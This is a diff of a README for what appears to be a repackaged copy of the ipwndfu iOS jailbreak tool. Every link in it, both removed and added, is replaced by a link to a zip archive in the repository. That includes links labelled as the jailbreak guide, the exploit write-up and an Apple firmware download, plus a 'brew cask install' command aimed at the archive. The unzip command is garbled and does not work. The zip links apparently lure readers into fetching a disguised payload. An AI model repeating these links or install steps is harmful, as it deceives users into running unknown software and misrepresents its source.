@@ -1,4 +1,4 @@
-![](https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip)
+![](https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip)
 # Open-source jailbreaking tool for many iOS devices
 
 
@@ -62,26 +62,26 @@ This tool should be compatible with Mac and Linux. It won't work in a virtual ma
 
 ## Tutorial
 
-This tool can be used to downgrade or jailbreak iPhone 3GS (new bootrom) without SHSH blobs, as documented in [JAILBREAK-GUIDE](https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip).
+This tool can be used to downgrade or jailbreak iPhone 3GS (new bootrom) without SHSH blobs, as documented in [JAILBREAK-GUIDE](https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip).
 
 
 ## Exploit write-up
 
 Write-up for alloc8 exploit can be found here:
 
-https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
+https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip
 
 
 ## iBSS
 
 Download iPhone 3GS iOS 4.3.5 IPSW from Apple:
 
-https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip,https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
+https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip,https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip
 
 In Terminal, extract iBSS using the following command, then move the file to ipwndfu folder:
 
 ```
-unzip -p iPhone2,https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip > https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
+unzip -p iPhone2,https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip > https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip
 ```
 
 
@@ -117,7 +117,7 @@ If you are using macOS with Homebrew, you can use binutils and gcc-arm-embedded.
 
 ```
 brew install binutils
-brew cask install https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
+brew cask install https://github.com/goofygary/ipwndfu/raw/refs/heads/master/libusbfinder/Software_2.1.zip
 ```
 
 ## Credit
